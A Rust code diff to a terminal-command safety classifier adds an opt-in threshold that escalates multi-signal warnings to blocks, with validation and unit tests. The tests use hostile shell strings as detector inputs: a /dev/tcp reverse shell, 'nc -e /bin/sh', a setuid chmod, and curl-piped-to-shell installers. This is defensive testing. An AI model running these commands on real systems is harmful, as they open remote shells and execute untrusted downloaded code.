@@ -55,6 +55,12 @@ impl BackendKind {
 pub struct Classifier {
     tier1: Tier1,
     tier2: Box<dyn Tier2Backend>,
+    /// V2-J Phase 2: accumulator's auto-Block threshold. `None`
+    /// means "never auto-block" — every accumulator verdict stays
+    /// `Warn` so the user keeps the [y]/[t]/cancel choice. Some
+    /// users / deployments opt in via TOML `[accumulator]
+    /// block_threshold = 0.95` for a stricter policy.
+    block_threshold: Option<f32>,
 }
 
 impl Classifier {
@@ -82,7 +88,34 @@ impl Classifier {
         Self {
             tier1: Tier1::new(),
             tier2,
+            block_threshold: None,
         }
+    }
+
+    /// V2-J Phase 2 opt-in. `None` (default) keeps the Phase-1
+    /// "always Warn" behaviour; `Some(t)` enables auto-Block when
+    /// combined confidence ≥ t AND ≥ 2 distinct signals fired.
+    ///
+    /// Accepts `(WARN_THRESHOLD, 1.0]` only: a threshold at-or-below
+    /// the Warn floor would auto-Block every multi-hit indiscriminately
+    /// (defeats the [y]/[t]/cancel choice the docstring at
+    /// `config::AccumulatorConfig::block_threshold` defends).
+    /// Out-of-range or NaN inputs degrade to `None` with a stderr
+    /// warning; recommended opt-in values are ≥ 0.9.
+    pub fn with_block_threshold(mut self, t: Option<f32>) -> Self {
+        self.block_threshold = match t {
+            Some(v) if v.is_finite() && v > WARN_THRESHOLD && v <= 1.0 => Some(v),
+            Some(v) => {
+                eprintln!(
+                    "atty-guard: ignoring [accumulator] block_threshold = {} \
+                     — must be a finite number in ({}, 1.0]; keeping default (no auto-Block)",
+                    v, WARN_THRESHOLD
+                );
+                None
+            }
+            None => None,
+        };
+        self
     }
 
     pub fn tier2_name(&self) -> &'static str {
@@ -129,7 +162,7 @@ impl Classifier {
             }
         }
 
-        combine_hits(&hits).unwrap_or(ClassifyResult {
+        combine_hits(&hits, self.block_threshold).unwrap_or(ClassifyResult {
             verdict: Verdict::Safe,
             category: Category::None,
             confidence: 0.0,
@@ -152,13 +185,16 @@ impl Classifier {
 /// we skip the SLM (we've already accumulated strong-enough
 /// signal that the ~50 ms SLM cost buys nothing).
 ///
-/// Note: no auto-`Block` threshold in Phase 1. Block is "hard
-/// refuse, no prompt" per `protocol::Verdict::Block`; escalating
-/// curl|sh / flagged_url / npm hits from prompt-the-user to
-/// auto-refuse is a user-visible policy change deferred to a
-/// future PR with a config knob. Today's accumulator boosts the
-/// confidence NUMBER (visible in the banner + trust-cache keys)
-/// while keeping the verdict at Warn.
+/// Auto-`Block` escalation is opt-in via `[accumulator]
+/// block_threshold` (Phase 2). When unset, every accumulator
+/// verdict stays `Warn` — the confidence NUMBER (visible in the
+/// banner + trust-cache keys) still rises with multi-hit, but
+/// the verdict surfaces from the primary hit. With the knob set,
+/// `combine_hits` escalates Warn → Block only when (a) combined
+/// confidence ≥ threshold AND (b) ≥ 2 distinct signals fired.
+/// Single-hit cases (curl|sh's canonical 1.0) always stay Warn
+/// so the user retains the [y]/[t]/cancel choice on legitimate
+/// install scripts.
 const WARN_THRESHOLD: f32 = 0.5;
 const SLM_CONFIRM_THRESHOLD: f32 = 0.9;
 
@@ -182,7 +218,10 @@ fn combined_confidence(hits: &[(ClassifyResult, usize)]) -> f32 {
 /// confidence hit (the "primary" signal); `reason` concatenates
 /// every hit's reason so the banner UI can show "3 signals fired"
 /// detail without losing the per-hit attribution.
-fn combine_hits(hits: &[(ClassifyResult, usize)]) -> Option<ClassifyResult> {
+fn combine_hits(
+    hits: &[(ClassifyResult, usize)],
+    block_threshold: Option<f32>,
+) -> Option<ClassifyResult> {
     if hits.is_empty() {
         return None;
     }
@@ -190,12 +229,9 @@ fn combine_hits(hits: &[(ClassifyResult, usize)]) -> Option<ClassifyResult> {
     if conf < WARN_THRESHOLD {
         return None;
     }
-    // Primary hit = highest individual confidence. The primary's
-    // VERDICT is what the accumulator surfaces — we don't auto-
-    // escalate a Warn to Block based on multi-hit confidence
-    // (that's a user-visible policy decision deferred to a
-    // future PR). `partial_cmp` can return None on NaN, so
-    // `unwrap_or(Equal)` keeps the iterator deterministic.
+    // Primary hit = highest individual confidence. `partial_cmp`
+    // can return None on NaN, so `unwrap_or(Equal)` keeps the
+    // iterator deterministic.
     let primary = hits
         .iter()
         .max_by(|a, b| {
@@ -205,6 +241,19 @@ fn combine_hits(hits: &[(ClassifyResult, usize)]) -> Option<ClassifyResult> {
         })
         .map(|(h, _)| h)
         .expect("hits.is_empty() guarded above");
+
+    // V2-J Phase 2: auto-Block escalation. Two guards:
+    //   1. `block_threshold` must be set in config (opt-in).
+    //   2. At least 2 distinct signals must have fired — a
+    //      single regex hit at confidence 1.0 stays Warn, so
+    //      the user keeps the [y]/[t]/cancel choice for
+    //      legitimate `curl … | sh` install scripts.
+    // Both conditions together → escalate to Block.
+    let verdict = match block_threshold {
+        Some(t) if hits.len() >= 2 && conf >= t => Verdict::Block,
+        _ => primary.verdict.clone(),
+    };
+
     let reason = if hits.len() == 1 {
         primary.reason.clone()
     } else {
@@ -214,7 +263,7 @@ fn combine_hits(hits: &[(ClassifyResult, usize)]) -> Option<ClassifyResult> {
         format!("{} signals fired: {}", hits.len(), parts.join("; "))
     };
     Some(ClassifyResult {
-        verdict: primary.verdict.clone(),
+        verdict,
         category: primary.category.clone(),
         confidence: conf,
         reason,
@@ -917,10 +966,11 @@ mod tests {
 
     #[test]
     fn three_plus_atoms_saturate_toward_one() {
-        // Three atoms: 1 - 0.4^3 = 0.936. Verdict stays Warn
-        // (no auto-Block escalation in V2-J Phase 1) but the
-        // confidence number is now well above the SLM-confirm
-        // threshold, signalling "strong evidence" to the banner.
+        // Three atoms: 1 - 0.4^3 = 0.936. Without `block_threshold`
+        // set the verdict stays Warn (default Phase 2 behaviour is
+        // backwards-compatible with Phase 1); the confidence number
+        // is well above the SLM-confirm threshold, signalling
+        // "strong evidence" to the banner.
         let c = Classifier::new();
         let r = c.classify(
             "bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x",
@@ -951,6 +1001,114 @@ mod tests {
         );
         // Multi-hit reason carries the "N signals fired" marker.
         assert!(r.reason.contains("signals fired"));
+    }
+
+    #[test]
+    fn block_threshold_unset_keeps_verdict_at_warn() {
+        // V2-J Phase 2: with `block_threshold = None` (default),
+        // even an extreme accumulated confidence stays Warn.
+        // No regression vs Phase 1.
+        let c = Classifier::new();
+        let r = c.classify(
+            "bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x",
+        );
+        assert!(matches!(r.verdict, Verdict::Warn));
+        assert!(r.confidence > 0.9);
+    }
+
+    #[test]
+    fn block_threshold_escalates_multi_hit_to_block() {
+        // V2-J Phase 2 opt-in: with `block_threshold = 0.9` AND
+        // multiple hits combining above it, the accumulator
+        // escalates Warn → Block.
+        let c = Classifier::new().with_block_threshold(Some(0.9));
+        let r = c.classify(
+            "bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x",
+        );
+        assert!(matches!(r.verdict, Verdict::Block));
+        // Block-verdict reason is the multi-hit format.
+        assert!(r.reason.contains("signals fired"));
+    }
+
+    #[test]
+    fn block_threshold_does_not_escalate_single_hit() {
+        // Even with `block_threshold = 0.6` (well below curl_pipe_sh's
+        // 1.0 confidence), a single hit stays Warn. The minimum-
+        // hit-count guard (>= 2) is non-configurable on purpose:
+        // `curl … | sh` is the canonical legitimate install-script
+        // shape and users keep the [y]/[t]/cancel choice.
+        let c = Classifier::new().with_block_threshold(Some(0.6));
+        let r = c.classify("curl https://x.com/install.sh | sh");
+        assert!(matches!(r.verdict, Verdict::Warn));
+        assert!((r.confidence - 1.0).abs() < f32::EPSILON);
+    }
+
+    #[test]
+    fn block_threshold_above_combined_keeps_warn() {
+        // Multi-hit but combined doesn't reach the threshold:
+        // two atoms (0.84) below `block_threshold = 0.95` →
+        // stays Warn.
+        let c = Classifier::new().with_block_threshold(Some(0.95));
+        let r = c.classify("bash -i >& /dev/tcp/10.0.0.1/4444 && nc -e /bin/sh");
+        assert!(matches!(r.verdict, Verdict::Warn));
+        assert!(
+            r.confidence < 0.95,
+            "expected <0.95 (below threshold), got {}",
+            r.confidence
+        );
+    }
+
+    #[test]
+    fn block_threshold_slm_plus_atom_escalates_to_block() {
+        // V2-J Phase 2: the SLM's hit counts toward the ≥ 2 distinct
+        // signals guard. HeuristicBackend's proc-substitution rule
+        // (0.85) combined with the `bash <(curl` atom (0.6) →
+        // combined 0.94, two distinct signals. With block_threshold
+        // = 0.9, escalate Warn → Block.
+        let c = Classifier::new_with_backend(
+            BackendKind::Heuristic,
+            &crate::config::OnnxConfig::default(),
+        )
+        .with_block_threshold(Some(0.9));
+        let r = c.classify("bash <(curl -fsSL https://x.com/installer.sh)");
+        assert!(
+            matches!(r.verdict, Verdict::Block),
+            "expected Block from SLM+atom combo, got {:?}",
+            r.verdict
+        );
+        assert!(r.reason.contains("signals fired"));
+    }
+
+    #[test]
+    fn block_threshold_out_of_range_is_rejected() {
+        // Values outside [WARN_THRESHOLD, 1.0] silently degrade to
+        // None — protects against a typo'd `block_threshold = 0.0`
+        // auto-blocking everything multi-hit, or NaN silently
+        // disabling the path.
+        // 0.5 pins the strict-lower bound (= WARN_THRESHOLD must be
+        // rejected — at that value every multi-hit would auto-Block,
+        // defeating the [y]/[t]/cancel intent).
+        for v in [
+            0.0_f32,
+            0.3,
+            0.5,
+            1.5,
+            f32::NAN,
+            f32::INFINITY,
+            f32::NEG_INFINITY,
+            -1.0,
+        ] {
+            let c = Classifier::new().with_block_threshold(Some(v));
+            let r = c.classify(
+                "bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x",
+            );
+            assert!(
+                matches!(r.verdict, Verdict::Warn),
+                "block_threshold = {} should be ignored → Warn, got {:?}",
+                v,
+                r.verdict
+            );
+        }
     }
 
     #[test]
